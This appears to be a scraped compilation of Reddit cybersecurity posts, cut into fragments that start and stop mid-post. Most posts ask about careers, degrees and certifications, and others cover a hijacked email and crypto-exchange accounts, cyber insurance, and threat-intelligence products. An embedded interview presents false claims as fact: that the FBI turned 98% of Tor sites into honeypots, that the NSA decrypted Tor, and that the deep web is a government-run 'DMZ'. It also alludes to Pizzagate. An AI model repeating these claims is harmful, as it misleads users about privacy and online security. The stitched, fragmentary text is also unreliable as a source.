cybersecurity. Since then, I went on to get my CISSP (really easy after taking the CSSLP) and being assigned a primary technical cybersecurity SME position for billions of dollars in assets) yay! &amp;#x200B; **My Philosophy on Professional Education** A little over 25 years ago, the most sought after degrees and profession was Internet Technology (IT). People flocked to this. Yes, that includes programmers, but I'm specifically pointing out those that went into traditional IT (firewalls, AD, etc). While those jobs still exist they have in many ways waned over the years due to increased automation, decreased expenses on personnel, and simple supply/demand. Why pay an IT person with a degree X dollars when I can pay someone with a Security + or A+ Y dollars less? Right wrong or indifferent that IS the current job market landscape. We are poised for this to happen again. Cybersecurity ""degrees"" and ""certifications"" are the new IT degrees and 10-20 years from now, you'll be either searching for a job or pigeon-holed into a career that you cannot advance from. Many of the tools that are being built are automating a lot of the ""Secure,"" ""Detect,"" and eventually ""Protect"" and ""Respond."" And, clearly with the huge national (and international) push for cybersecurity professionals there will be a LOT of supply. So, what does that mean? Does that mean a ""cybersecurity degree"" is useless? Not at all. Like everything it has its purpose. I think it is very important to ask yourself ""where do I want to be after 10 years in my career"" not ""what do i want to do for a starting job."" Understand that programming and ""hacking"" are entry level positions in many ways. If you want to stay there, then you'll want to expect to stay at that wage-level. It isn't all bad news of course, because you can be a SME or an ""lead,"" and if that is what you love, why would you want to do anything else? However, the importance of asking ""where do I want to be after 10 years"" is because a pigeon-holed technical degree may not get you there (though it might). &amp;#x200B; **So what are you really saying?** While there are a LOT of job openings looking for ""cybersecurity professionals"" there are many more jobs looking for ""Scientists and Engineers."" And, many more jobs looking for ""MBAs,"" and ""Accountants,"" etc. ""Wait a minute, this is a cybersecurity channel!?"" Yes, and the very best cybersecurity professionals that I've run into in the last 5 years have been those that have vectored from another career path and APPRECIATE the mission, business, technical challenges of implementing cybersecurity measures. You see, many IT people whoa re cybersecurity people understand how to lock down a firewall, but they don't understand how to lock down a CNC laser mill that is used for titanium manufacturing. However, an industrial engineer turned cybersecurity professional does! Or, how to apply Security Policies to the (ANCIENT) Windows XP machine running that MRI machine at the hospital, but a medical technical with a Security+ does! You see, it is the professional education PLUS cybersecurity philosophies that is needed in the ""REAL"" world, especially in the world of cyber-physical systems. What about those MBAs or Accountants I mentioned? And MBA or Accountants with cybersecurity knowledge is going to be able to understand that Incident Response Plan, Continuity Plan, etc and understand why it is important and how it can actually SAVE the company many. Wow...can you imagine a situation where you have a Senior manager, President, or CEO that has a CISSP?! They would have a MUCH better understand of their cybersecurity group's challenges than one without. &amp;#x200B; **Conclusion** **Please remember that this is just my opinion.** We are still early in the development of the ""cybersecurity professional"" degrees and course-wares, and potentially they will get very good. If you don't mind being pigeon-holes in your career, then that might be the perfect solution for you. However, if I am a manager at a company, and what I really need is another engineer, but I have GOT to get this cybersecurity thing figured out, and I see an EE with a CISSP/CSSLP/Secure+/ETC, then that person just hit the top of my list. If I'm a MBA with a CISSP, I have a very good chance of getting promoted because I have a better understand of the cyber challenges to the company. In my line of work, we have a statement ""Cybersecurity is everyone's job"". Well if you believe that, then no matter what career path you are in, I recommend investing in a Security+ and eventually a CISSP, because you will DRAMATICALLY increase your value to your company. &amp;#x200B; Thanks for reading! I hope it has been helpful."

I am a former Homeland Security analyst and humanitarian aid professional with nearly 10 years of professional experience beyond undergrad. I figured I would make a post about my program and answer any questions you may have. &amp;#x200B; I chose this program because I can take classes at three different schools--the School of Informatics and Computer Engineering (SICE) in the technical side of cybersecurity, the Maurer School of Law in cybersecurity and privacy law, and at the Kelley School of Business in the management side of cybersecurity. Also, I can take advantage of the career services of all three schools. Next year, I am going to focus on recruitment through companies such as PWC, Accenture, and FireEye. While I could have entered a graduate program that focused only on the technical dimension of cybersecurity, I believe that the classes in law, policy, and management allow me to get a well-rounded education that can more adequately prepare for the needs of potential employers. &amp;#x200B; Last semester I began my program taking 3 classes--information security law, privacy law, and a technology bootcamp for people without a computer science background. I spent additional time studying for the Security+ exam. This semester, I am continuing my legal and policy coursework in cybersecurity, cyberwarfare, privacy law, and a technical class on information systems security and taking a non-degree course for the (ISC)2 Associate exam. The program is a 30 credit program. &amp;#x200B; Most of our classes can be taken online, and it offers flexibility for those not wishing to move to the small town of Bloomington, Indiana. Indiana University has an excellent online coursework infrastructure. &amp;#x200B; For more information on the program, you can go to our website at [URL"

If that goes smoothly I will be moving to Houston to complete a Masters in Cyber Security. That plan seems great but as anyone reading, this knows. The IT field right now is a massive black hole with a billion different paths and fields one could take. My question starts their, for anyone who has already completed a post-secondary program or chose a Cyber related career, are there better ways to do this? Should I take a degree in Computer Science instead before moving into Cyber Security? Should I just take a Cybersecurity Bachelors right away and scrap the Masters? (I live in Canada and there aren't many CS bachelors here yet, besides maybe in Toronto). So I would have to move to Houston, Seattle, San Fran etc to do that. Are there any better (and cheaper) Masters programs for CS than Houston? (my backup is Washington State). I have lots of experience in most IT-related fields (some self-taught). Web Design, basic coding, lots of experimentation with Linux (mostly Ubuntu, Arch, Fedora), Virtualization, Remote Connection, Upgrading and Installing all major internal hardware components (PC's and Laptops).

Long story short, I am starting to go after some security certs and getting job training when time allows on security (blue team oriented) tasks. I know I want to get involved in Cybersecurity and I know it wont be easy, but one thing worries me.

Literally 75% or more say something along the lines of: Required Education: Bachelor of Science in CS/IT/ Or a related field. Some even said A technical degree is required. A technical degree is any degree in CS/IT/ or Engineering. Not to repeat myself, but when I say a lot of the job ads I saw said this, I mean A LOT. Tons. Is this just HR or the hiring manager fluffing up the job posting? Or is it really best to have that specific degree type? I went on some other forums for IT and cannot seem to get a clear answer. I read some people saying any degree will do, while a few others told me stories about HR application systems filtering out degrees that do not match the specific criteria set by the job. Their advice was to get that second degree if possible and if I could without trouble. Should I go back and nail a BS in IT if I can do it quickly and without pain? Any advice is appreciated!"

I'm very happy with this, but I must admit that I am quite afraid about what will be asked and what they expect of me. They've read my CV, they know my background and lack of experience and expertise, but I still want to give it my best and show that I can be a good asset to the company. I'll be taking the role of Security Data Analyst, which entails that I : * set-up the right interfaces to collect all relevant security data sources * ingest the relevant security data sources into the appropriate platform (Azure) * define the right parameters and algorithms to understand and interpret the data and filter out any false positives * create the right metrics and reports/dashboards (using PowerBI) * define the relevant processes and tools allowing to trigger the necessary actions for security operation and CERT teams As I've stated, I do not have qualifications in Computer Sciences, Information Technology or Software Development and Planning, and so I fear I am going to flunk the master interview. My plan is to spend the weekend studying and preparing for the interview, and I was hoping some of you could advise me on what to focus on, what to say and ask, special key notes that will make my interview shine above the others.

Let me start with the negative, I have a 2.8ish GPA and a 1380 on the SAT (New SAT out of 1600). I haven't taken that competitive classes and am often in the middle-level college preparatory class level for most subjects. Due note that my school is extremely competitive and is not really standard high school (i.e Calculus in 12th grade is normal). On the other hand, my career in computer security so far has been extremely strong. &amp;#x200B; Here's what I've done the past 4 years: * 2 Blind SQLi vulnerabilities in school grading system giving me access to over 5 million student and teacher personal records (including health, grades, basically everything the school had on you) * RCE in a piece of software that came pre-installed in all machines by a major computer manufacturer. * Worked for a fortune 50 (not a typo) company this past summer, will most likely work in their security department this summer. * XXE in school grading system. * LFI in school grading system. * Account hijacking vulnerability in health provider (major). * Several XSS/CSRF vulnerabilities in bunch of school and general stuff. * Some other stuff I'm forgetting &amp;#x200B; Point is I have a decent amount of experience for a high school student. Some of my mentors in the field have suggested maybe college isn't right for me, whereas others have strongly suggested it. I know I have stuff to learn, but my question really is, ""Is the stuff that I'm missing not obtainable through experience, and just academic education?"".

Cyber security and IT security are two of the most popular careers today as more emphasis is being placed on security within organisations. Security has proven to play a massive role in business today with security breaches costing companies millions and sometimes even billions. However, even though cyber security and IT are similar, in terms of career paths they are slightly different. To help you decide which career is best for you Ive outlined the main differences between cyber security and IT security careers. First well start off with the difference between the two fields. ## IT Security vs Cyber Security Cyber security and IT security share a significant amount of similarities and when combined ensure maximum protection for organisations. However, they are often considered to be the same. IT security and cyber security are in fact two different fields that tend to overlap from time to time. To better understand the difference in careers, lets first unpack the difference between IT security and cyber security. ### IT Security IT security refers to: *the information security which is applied to technology and computer systems. It focuses on protecting computers, networks, programs and data from unauthorised access or damage.* [**technojobs**](URL IT security is a broad topic that incorporates different forms of technology such as physical computer hardware, networks, mobile technology and more. IT security merges into different technology forms and involves the safeguarding of various kinds of data. This data can be in electronic form, or even in the form paper! IT security ensures the protection and safety of information, in all its different forms. This includes physical and electronic data. The overall consensus is therefore that IT security covers the protection and prevention of physical and cloud-based data from being hacked. ### Cyber Security Cyber security covers similar aspects to IT security, however there is more focus on electronic data. *Cyber security comprises technologies, processes and controls that are designed to protect systems, networks and data from cyber-attacks. Effective cyber security reduces the risk of cyber-attacks and protects organisations and individuals from the unauthorised exploitation of systems, networks and technologies.* [**IT Governance**](URL Cyber security serves the purpose of ensuring data is protected from unauthorised access. Through cyberspace or online platforms, unauthorised access may result in cyber-attacks. Cyber security therefore is the field which focuses on the protection and prevention of cloud-based network attacks. In a nutshell IT security and cyber security go hand in hand. IT security gravitates more towards the protection of the physical information which also includes electronic data, while cyber security generally refers to the protection of online or cyber information. ## Cyber Security Career vs IT Security Career In terms of careers, cyber security and IT security are equally great career choices with both offering excellent opportunities and competitive salaries. The difference between a cyber security career and an IT security career lie in the different fields from which these careers originate. The career progression as a result is slightly different too. However, at the end of the day both careers deal with the value of data, in its many different forms. ## IT Security Career According to IT Jobs Watch, IT Security Managers command salaries of 62,500 on average in the UK. This impressive salary shows no sign of decreasing as IT Security is becoming more and more important in society today. As we place more and more value on information, so organisations place more importance on security. A career in IT Security often begins in general IT and then branches out into a specialised field. Many IT security professionals started in general IT positions such as an IT Technician role, Field Engineer or even in a Help-desk role. IT security as a career involves a focus on making sure an organisations data is kept secure. As an IT security professional, you could be responsible for front-line defence of networks and protecting information from unauthorised access and violations. You will be expected to prepare technical reports, run tests and monitor for abnormal activity. As an IT Security Professional you can expect to be the gatekeeper of all organisational information. ### IT Security Career Path As an IT Security Professional, careers which you can pursue include, but not limited to: 1. IT Security Administrator 2. IT Security Analyst 3. IT Security Officer 4. IT Security Architect 5. Head of IT Security ### IT Security Training In order to move up the salary scale, gaining industry recognised certifications is an excellent step. If youre new to IT and are considering heading into the field of IT security, the [**IT Placement Program**](URL is an excellent first step. As stated earlier, many IT security professionals started their careers in IT Technician roles or Field Engineer roles. The IT Placement Program from ITonlinelearning offers students a job opportunity and study package geared to IT beginners. This course prepares students for a general IT career while also laying the foundation for those who wish to move into the direction of IT security.

Of all the IT careers today, cyber security is one that is definitely trending with a top-notch salary to match! Cyber security professionals are some of the most in-demand professionals today as the UK is experiencing a major skill shortage in the field of cyber security. As a Cyber Security Professional, you will have a range of career options. However, it is important to note that this is a specialised field. This means that youre unlikely to begin your career in cyber security and will often come from a general IT security position first. As a Cyber Security Professional, you will be expected to prevent detect and manage cyber threats. Youll be expected to be up to date with the latest security trends, plan for disaster recovery and use advanced analytic tools. You will be tasked with investigating security alerts and providing incident response. Many Cyber Security Professionals started their careers in a general IT position such as an IT Technician or a Field Engineer role. ### Cyber Security Career Path: As a Cyber Security professional, careers which you can be pursue include, but not limited to: 1.

Cyber security is as much a part of IT security, as IT security is a part of cyber security. In terms of careers, each career is concerned with the preservation of data however each from a different angle. As IT security tends to be more in the physical and virtual realm, where cyber focuses more on the virtual, both compliment one another. As the end goal is the preservation of data, we require both fields to ensure optimum security. Whether you decide to head into the realm of IT security or cyber security, both have various advantages and career paths."

Next year - following certs I want to get 2019 Offensive Security PWK Red Hat CSA CCNA Security Then at the end of they year - RHCE and Maybe OSCP From the following year 2020 This is where it gets tricky 1 year experience in work at this point I'm looking to find the most junior position and hopefully a company that will hire me as a pen tester, In this year I also wish to do the following certs CCNA Security CCNA Cloud and 2 of the RHCE course that lead towards RHCA and maybe slide in VMWARE In 2021 I wish to do my last 3 RHCE courses to write my RHCA Cloud at the end of the year with a focus on cloud in 2022 Cloud - AWS MCSA - 2016, CLoud, Linux on azure MCSE - Cloud , Maybe MSCE mobility AWS architect Google Cloud Architect In 2023 I wish to do my GCUX SANS GPYC - I wish to focus on python mainly through out these years as I have also picked up an interest in robotics and making robots for fun with lego in 2024 I wish to my big one CISSP Please note I wish to funnel in cash throughout the years into a massive flat lab that I can study and learn all these things I do not plan to buy a house till i'm in my late 30s as I wish to financially secure myself first and renting a flat is the most frugal option till then My main focus though is to work in this time period as a Pen Tester and do the non security certifications in my spare time I understand this may appear to be a collect a cert way For me personally I'm viewing them as milestones on having the BASE understanding obviously further education and training is needed aswell as constant learning and education as this field goes This is my 5 - 6 year goal path My personal interest with cybersecurity lies in the field of organized crime or cyberwarfare After this point I wish to get work in this field My next big question is would it maybe be better to work in the more formal it field for the 5 years and practice pentesting in my own time instead of working in pentesting and practicing the more formal IT field at home Past this 5 year mark I wish to do my CCNP in R&amp;S + Security aswell as Juniper Networks aswell R&amp;S Security at this point I'm feeling abit lost as what to do or which would be the best route to take Aswell as doing the juniper and cisco infrastructure The other reasons for all these is I'm absolutely Petrified in every shape and form of being out on the street and not being able to be the best person possible in my life, If anyone is able to give guidance and help me Thin the herd that would be very much appreciated, My belief is that being a hacker is a mental paradigm that can be applied in both IT and normal life, alot of the times having multiple points of knowledge helps all the brain dots connect and intertwine of understanding I also understand that hacking/pentesting is not just using Kali Linux or any other Linux OS security related as they are merely a set of tools that can be used and this does not make you a hacker Knowledge practice and experience does For most people I understand........ THIS IS A MASSIVE AMOUNT OF KNOWLEDGE and alot to learn, the only reason my goals are so high I HAVE AN INSATIABLE HUNGER FOR SUCCESS and More so the ability to be a father at home and connect and create experiences with my family and eventually a restaurant in the future once I hit my 40s I have also surrounded myself with individuals of similar mindsets to learn and grow Thank you for taking your time to read the following any advice that can be given will be appreciated"

I recently found out that my friend has apparently had his primary email hacked. He is not the most cybersecurity savvy so he asked me for advice on what to do. Credit Wise notified him that his email was found on the dark web and the status on the password said exposed. He still has access to the email and it seems that none of his accounts on other websites have been compromised. Would it be correct to conclude that basically his email has been hacked and someone has had access to the account along with all the emails and information inside? And if so, to follow up, what would be the best course of action to re-secure and seal off his account security wise? He said the email is the primary email he uses when creating accounts on other platforms, so should he be worried about a hacker gaining access to those other accounts through password recovery? And what of the issue of identity details? If his email is likely to contain any details of personal information, should he be concerned of the risk that those details may already be saved and out there for use of identity theft? Finally, what security measures should he take to best deal with the situation? Since he still has access to the email and no malicious action has seemed to have been taken yet on any other accounts: 1. Would simply changing the password along with adding 2-step verification be sufficient enough to re-secure it. Should he possibly consider starting over completely, creating a new email and moving all of his accounts over to that? 2. When an email has been compromised once, is there anything that the hackers can gain that would allow them easier re-access later on in the accounts history in comparison to if they had to just break into a new account? 3. Im guessing it would be pretty common sense to assume that any other accounts that he has created with that email and therefore uses that email as a password recovery for has also possibly been compromised and should have the password changed? Sorry if this post is a little lengthy. My friend came to me for advice on the situation and these were the possible things i could think of that he should be concerned about. Im definitely also not an expert on the subject so i thought Id see if anyone could elaborate on the thoughts. Any help or insight would be very highly appreciated and thank you for taking the time to read. TL;DR: Friends email was reported hacked by Credit Wise and the password exposed. 1. Are his other accounts created using the email at risk? 2. Should he be concerned of his personal info being out there for identity theft? 3. Should he just change pass or make a new email completely? 4. He probably has to change all other passwords associated with the email right? "

Absolutely. My name is John Modica. I am a Cyber Threat Specialist, within the Cyber Threat Intelligence and many other areas of the Cyber Security field. I have 20+ years of experience. I do Part time development for the Kali Linux OS, and I own my own Cyber Threat Intellegence Company. # Can you explain a little what cybersecurity is? Cyber Security is a very broad and generlized term. This can include some, but not limited to the following: Pentesting, Ethical Hacking, CISSP, CRISC, Senior/Junior Executive levels, Information Specialists, Risk Management, Analytical Specialists, and many, many more. Then you also have all the different industries that require these branches to function such as: Military, Government, Cell Phone Companies, Health Care Providers, Cable Companies, Manufacturing plants, etc. # What people need to know about cybersecurity that no one talks about it? People do not realize the importance of security in general, none the less the basics of Cyber Security. The ethics of keeping good security also works by understanding the vulnerability within your own systems. Some do not realize that what hackers actually do by their illegal activity, is helping companies keep up the security of their systems/networks. Even though we all can hire Ethical Hackers and Pentesters to test our products and such, it is often thought of as a good thing, because it saves us money, and they help us understand where we need to patch up, so we dont lose any more money in damages. So the importance of having the hackers/attakers is actually very grande. Often times enough, these attacks gives us an idea from an outside perspective. # How can we protect our computers better? In this day and age, there really is not a way to actually protect your computers or devices. Deep state will continue to survelle. If a hacker or agnecy wanted to find out who you were and where you are located, they will figure it out. I always say, To master Offensive Security, One must master Defensive Security The best thing to do is use tools that will give you the info on your attackers. Signature based IoCs like Snort, Artillery, Fail2ban, Iptables, Honeypots, and other means to identify and log your issues, would be the easiest thing to have. Most people get out of the Anti-Virus business, because its not the viruses/malwares you need to worry about. # How can we navigate through web more anonymously? Well, I do not like to be the bearer of bad news, but there is no such thing as being anonymous. You see, the FBI has already infiltrated 98% TOR URLs and spoofed them as TOR HoneyPots in 2013. In 2015 ,the NSA officially was able to decrypt the TOR network and remove the most imortant file that kept it some what encrypted. Number one rule of thumb was to never tunnel normal traffic through the TOR Network. By trafficing normal data using the TOR Network you risk leaking alot of data. Then we have Exit Nodes. Each exit Nodes is known to act like a MITM. They are able to see and collect all your data, cookies, and passwords. If you arent using what they call good exit nodes, you get flagged. There is also a group called the Shadow Server Foundation. The Shadow Server Foundation scans the entire dark web on 0.0.0.0\*, to check for suspicious DMZ users. They can be found here [URL . VPNs also get audited every fiscal year. VPN companies do not want to be held responsible for other individuals illegal activities. # For the people who want to begin to learn cybersecurity where should they start? I suggest learning everything you can. Keep up-to-date with threat reports, upcoming threats, and other news. I also suggest getting certifications, and a degree of somekind to help your resume. Good info can be found on [URL Always have a good sense of Defensive security before you get on the Offesive side. # What kind of mistakes people do, when they begin to learn cybersecurity? The biggest mistake people end up doing is, following and believing in other people online with fake aliases. They give out WhatsApp, Email, and other sensitive information in public places. # What advice you can give to those people? The most vital advice I can give those people is to make sure you evaluate the people you speak to online. Things like e-mails, and WhatsApp accounts can be hacked easily. Some people have credit cards and bank information tied to e-mails, as they give up this identity, freely to others. People just give out far too much personal information to relative strangers. K.I.S.S (Keep It Simple Stupid). # What books about cybersecurity you recommend? This is a very general topic. For example, you have the different industries (Health IT, Manufacturing Plants, Car Companies, Cell Phone Companies, Cable companies, State and Federal Governments and their different agencies). You also have the different level of branches and departments (CRISC, CISSP, CTIO, CTO, CEO, SEO, CCNA, Risk Managment, Breach Specialists, ETC). What I can say is, being that Cyber Security is an extentive and broad area, explore a specific aspect you are interested in, and find books related to it. # Can you brief explanation about what is deep web and, how we can acess it? Deep Web is a government controlled part of the internet located on the DMZ, or De-Militarized Zone, where they have websites hosted for BlackMarket, Drugs, Pedophillia, Weapons, and other illegal activity. Some places on the Dark Web has been hosted for hacktivists to use as journals. All of which is being watched. Normally to access it, you need grab the Tor Browser and privoxy. But as I mentioned above, it is no longer encrypted. Some people ruin it for others. # How Tor works? The best answer can be found here: [URL But again, it is no longer encrypted. As long as you traffic normal data using the decrypted network of relays, Tor does not prevent an online service from determining when it is being accessed through Tor. Meaning places like Facebook, and other services can see you are on it. Thats why it was never meant to use for normal data. # Do you think people should visit deep web at least one time and why? No, I do not think anyone needs to go onto the dark web. Simple curiousity can take a dark turn quickly because the deep web is actively being monitored by many entities. Your true identity can be found using the TOR HoneyPots. The DMZ and TOR was originally created for the government, by the government to send and recieve information. If they created it, why would anyone think its anonymous. # Is the deep all bad? No, not all. However, good or bad, it is being monitored. # Does Marianas web exist? I dont think I should answer this one. PIZZAGATE should be enough to answer this. ### What programming language you think people should learn to begin the hacker path? There is many languages to learn. To be honest, the original Fortran language can help you learn the bases of all of the languages available. # What hacking books you recommend? They is too many books available. All information is good information. Each tool has their own books, for the most part. My own personal resource liberary contains 10,000+ volumes that I refer to regularly. However, I caution anyone getting free books from unknown online sources, i.e (social media platforms). These can often lead to bad URLs. # What being hacker means? Being a hacker means to have your own scripts, learning new things everyday, being the first to find a bug, patch, or exploit. People today do not realize that using other peoples tools doesnt make you a hacker. Maybe a pentester, but not a hacker. Using other users scripts and such just means you follow directions well. # What motivates you? Helping, and giving advice motivates me. I personally enjoy motivational speeches and music. ### Whats your definition of sucess? The definition of success, to me, means not taking no as an answer. Do not give up, try harder, and look forward. Persue your ideas and passions. The past is not a mistake, it is an experience \- **John Modica** Facebook [URL I share useful things on Github [URL My twitter [URL Huge thank you to Mr.John Modica for answering this questions.

I was recently hired in marketing at a company that makes Threat Intelligence Gateways (TIGs). I took the role because I'm very interested in cybersecurity, despite my non-technical background, and the TIG space is fairly new &amp; still considered ""emerging"" (which is fun!). I don't want to name the company because I don't want to be a shill or identified - there are multiple companies that make TIGs. One thing I've noticed in my job so far is that not many people or companies have heard of TIGs (not the ones we've talked to). Or they think their firewall can handle the threats on its own. (Quick background on what a TIG is: TIGs automatically block huge numbers of aggregated known IP &amp; domain threats on a granular level prior to hitting the firewall so less threat indicators hit the firewall &amp; it can spend its processing on deep packet inspection, etc...can also block outgoing network threats as well such as C&amp;C attacks...reduces alert fatigue and attack space, no latency, auto-updates threat feeds, etc). In my quest to understand how a TIG could be useful to Threat Intelligence/Network Security/Cybersecurity professionals, I have some questions that would help me (immensely) at my job if you are willing to answer! 1. Have you heard of Threat Intelligence Gateways and if you have, where? 2. Do you think a TIG would be useful to you &amp; why (if you're open to explaining)?

I've seen a lot of talk about a BS not being sufficient on its own to get into cybersecurity, and that makes sense with the necessary courses being less focused on any particular area for CIS, but it seems the MS program builds on that and focuses on one of a small number of areas of cybersecurity.

To address these problems on a larger scale, we decided to integrate blockchain technology with cybersecurity tools built for websites and enterprise networks. This integration will not only protect users from malicious activity (phishing sites, scams, hijacked domains, etc), but anonymously donate data to our AI based deep learning neural network called VISION which then secures the data onto the open blockchain. Essentially the more people that use the application to secure their devices, the stronger the network gets. We wanted to get input from other experts within the cybersecurity and info-sec industry on your opinion of decentralizing cyber threat data using blockchain technology.

Im a first year PhD student in English. I have a BA and MA in English Literature. At the end of my MA, I applied to both a number of PhD programs and a MS in Information Systems. I felt burned out on Literature Studies and academia. I should have taken up the MS in IS, but I felt completely insecure about my lackluster tech background. When the PhD acceptance came, I took it with a little bit of renewed energy despite the terrible job market. Now Im barely into the PhD program and the burn out is back. I regret skipping the MS in IS. I found an online MS in Cybersecurity nearby at a private college that I may be able to get into after my first year in the PhD program is up. Im not in great shape financially, so any decision is huge. My wife and I need the extra student loans to get by right now, so whatever I do, it must be a graduate degree. I understand that the general good advice would be to take free online classes and work towards certifications. I agree, but my financial state makes the degree seem like a more lucrative option to start learning. Should I forgo the next 5 years of literary study and attempt to pursue a MS in CS? Can I, after a 30 credit program, get a crack at an internship when its over? Am I too far behind, and should I kill this newly found desire? All thoughts are welcome.

The profile is as follows: profile picture of pretty twenty-something y.o. female. First few posts usually some kind of pornographic video. Earlier posts appear to be what I would describe as normal Facebook posts (in Indonesian according to Google Translate) and pictures of the old(?) users and their friends. From the look of it, they are probably high-school age. Zero mutual friends. My profile is set to public, though most of the information is either fake or a joke. I know that I can be found in a random search of Facebook's own, official user search, but I'm still wondering if I'm being specifically targeted by something or someone who is also active in Indonesia. I have marked this as NSFW in case it leads to something explicit. Sorry if that's incorrect."

While protecting these types of data (I'm talking phishing URLs, malicious IP addresses, web vulnerabilities, exploited plugins for CMS's, etc), may be beneficial for a cybersecurity solutions company, would it actually be better for all this data to be decentralized and open to the public? This would: * Minimize fragmentation of data between entities * Result in a more comprehensive, larger database * Allow developers to build their custom security solutions (open source baby!) * Reward anonymized data donors that are marked positive to be a legitimate threat What are some negative/positive consequences you feel that could stem from an open source database of aggregated threat data?

I am currently in a Masters degree program for Security Technologies. My background is in sales and marketing but Information Security is where I want to be and this program is going to help me pivot into a new field. I am minoring in Cybersecurity, and a lot of the coursework has been IT risk management thus far. I am starting to gather ideas for my capstone, which is some sort of real world application of a security related project. Right now, the main ideas I have are centered around seeking out companies and doing risk assessments for them, or building up a mock security organization for a company who is not up to par. However that seems to be a common choice for this program and I would prefer to stand out. For example, I did a mini capstone early in the program that is supposed to follow the same guidelines. Some examples from those presentations are Information Security risk assessment for local health system, assessment of local airport, SCADA systems, water treatment facility assessment, and so on. I will be graduating in about one year and Im just trying to gather thoughts and possibilities to start narrowing down a capstone choice. Im hoping some more experienced and technical redditors could give me ideas about what could be a compelling capstone, or something that you would be interested in seeing done in your own organizations.

I didnt get any certs because I wasnt sure what sub-field I wanted to specialize in. During the course of my studying, I find myself particularly interested in pen-testing. Im at the tail end of my degree and its been the most interesting and challenging course and Im on track to complete it with a solid A. I currently work as a cybersecurity analyst and once Im done with my degree, I will have exhausted by GI Bill benefits, but I really want to get security + and CEH as starter certs. Ive done the free training of fedVTE and cybrary.it and taking security + practice exams, so Im fairly confident I can pass without the course. A lot of the security + is close to what I learned in class. But I think Id like to take the CEH course before the exam. CEH is very expensive and as I mentioned, I wont have enough benefits left to finance it. I know it wouldve made sense to get the certs before a masters but after a lot of thinking, the masters was the better use of my benefits. So my question is: How would I go about paying for a certification course? How did you finance yours? I work for a small cybersecurity solutions business, so I dont think its something my employer would be willing to cover. They are already going to be covering my security clearance, which is very expensive itself. "

I recently completed my Bachelor's in Technology in Electronics and Communication Engineering with an aggregate of 8.6 CGPA (on 10). I'm interested in Cyber Security and wish to pursue a Masters in the same. However, most MS courses dictate that I'd have to take up foundational courses as my undergraduate course wasn't majoring in Computer Science. That's when I found a Masters of Engineering in Cybersecurity program at the University of Maryland, College Park. However this has left me confused as to which I should choose, and as to whether I should drop my plan to pursue Cybersecurity at all. 1. The fees in the USA is quite high and there are limited scholarships to go around. Added to this is the fact that job prospects are looking grim in the current scenario of visa regulations in the USA. However, US universities are pretty much the hub of the security business with affiliation to the NSA and Dept. of Homeland security. It is also a 2 year course. The universities are ranked within the top 100 in the world. 2. Fees in Europe are slightly lower and there are chances of acquiring scholarships. Some universities offer internships and there is a longer stayback period to search for a job. However these courses are only a year long, and has made me wonder why a PG course isn't 2 years long. There are again two optiond here : 2 A) The UK where the fees is higher and stayback period is limited. Course period is just 1 year. However, the universities have better world rankings. Foundational courses would incur additional expenses 2 B) Universities in other EU countries like Talinn University in Estonia. They have a 2 year course and the fees is extremely low and having to do a foundational course would be affordable. However, the ranking falls beyond the 700 mark and has me concerned. All these factors make me unsure whether I should even be pursuing this course. The benefits of each place seem to be neutralized by other cons that make it undesirable. What should I do? Any advice would be greatly appreciated."

( I have never been hacked before and I am careful so not sure how this happened ) 2. Hacker did not change my password but had access to my email 3. Hacker added all possible binance domains and emails to my blocked addresses list: ![img](33o4bkokt1611) 4a.

I have 2FA authentication enabled for most of my exchange accounts (e.g. Binance) but still hacker was able to change my passwords on several Exchanges (not only Binance). Not sure how without me getting a notification email. 6. I can see there were logins on my accounts from unknown IP addresses. As far as I know nothing was stolen. Also I have very little amounts on my accounts (20-30 USD) in coins so not even worth the trouble. I saw this in my account activity: UNKNOWN\_IP\_LOGIN\_B4\_2FA UNKNOWN\_IP\_PASSWORD\_RESET\_SUCCESS **What did I do ?** By accident I saw the new Recovery email addres (@[cmail.club](URL I deleted this email address. I then checked my account and discovered the forwarding address. I deleted This one too. I saw the blocked binance addresses and deleted this list. I changed my email password. I activated extra security measures. If there is something I missed here please tell me !! **Questions** : I access my email on my phone and can see all incoming emails immediately. So not sure how it was possible for hacker to ask for a password reset link and I did not see an email for that. Obviously they got the forwarded emails and did password reset on several of my exchange accounts. Anyone has experience with this ? Is there anything I can do to prevent this kind of hacking ? This was clearly aimed at hacking my BINANCE account and because this has 2FA they tried to get me to give them my PRIVATE MEW KEY. I don't fall for scams but this one had me fooled for a while.

1643,cybersecurity,cybersecurity,Confused about how much Cybersecurity Insurance I need for my business,16,8tq2jq,https://www.reddit.com/r/cybersecurity/comments/8tq2jq/confused_about_how_much_cybersecurity_insurance_i/,2018-06-25 22:23:01,"**About us:** I own a subscription website with about 200,000 active, paying users. We also have 1,000,000+ accounts that are inactive - either free trial accounts or expired ones. We have high overhead and the price is low, so even though it's a lot of paying users... we're still just average, not-rich people working for a small business. We have 10 in-house employees, 2 of which are developers. Nobody is a cybersecurity expert, but we are doing our best - and we're looking to buy cyber security insurance. Our passwords are encrypted. We don't collect banking information, store credit card information, no health information, no social security. We have nothing super confidential. We don't use auto-renewal or store credit card info. Our servers are on Rackspace. **What we collect when someone signs up:** - name (first and last) - email - state and/or country - username (chosen by user) - password (chosen by user; encrypted) Users can voluntarily choose their job from a list, and they can also tell us their birth date and year, if they wish. That's about it. **What the insurance company salesman tells us:** - A Cybersecurity breach costs $49 to $69 per user, on average. **What I need to know:** - How much coverage should I have? - 200,000 active users times $49 = 9.8 million dollars - 1,200,000 total users (active + inactive) time $49 = 58.8 million dollars. This seems.... high. There's no way we can afford a 58 million dollar policy. And a 9 million dollar policy would also costs tens of thousands too. Not something we can afford. I want to take the insurance agency's numbers with a grain of salt. I mean, I do want to be secure and protected, but they are trying to sell my insurance. Would it really cost $49 per user to ""fix"" a hack on our database? Would the price in this stat be for a situation where credit monitoring were required? Or for an small company like ours that doesn't have much information on users? **Another Question:** Let's say Company A has a website that collects full name, address, phone number, mother's maiden name, family member names, workplace name, type of car you drive, and a list of items in your fridge. Company B's website just collects full name, email, username, and encrypted password. If both databases are hacked, will both companies pay the same amount to ""fix"" the situation? ____________ I was thinking more like a 1 million or 2 million dollar policy. Would this be enough? For context: $1 million would cost $1,800 per year for 200k users. (We can afford that.) $2 million for 200k users would cost $2,000 per year. (Again, we can do that!) $3 million for 200k users would cost $6,000 per year. (We can afford it, but why did the number jump so much?) But $10 million? Or 58 million? I can only imagine.... **Last question:** Our database has 200,000 active, paying users. We have over a million expired or free trial customers. Should we delete all of these old customers from our database? Is this a serious liability for us? We do market to them via monthly email newsletter. Sometimes they come back after an absence. And if they do come back, their account is all set up for them. ...but if this is putting our company in a position where we can't afford to protect our data, maybe we should delete all of these old accounts. Thoughts? ----- Note: This is a throwaway, but I will check back. "

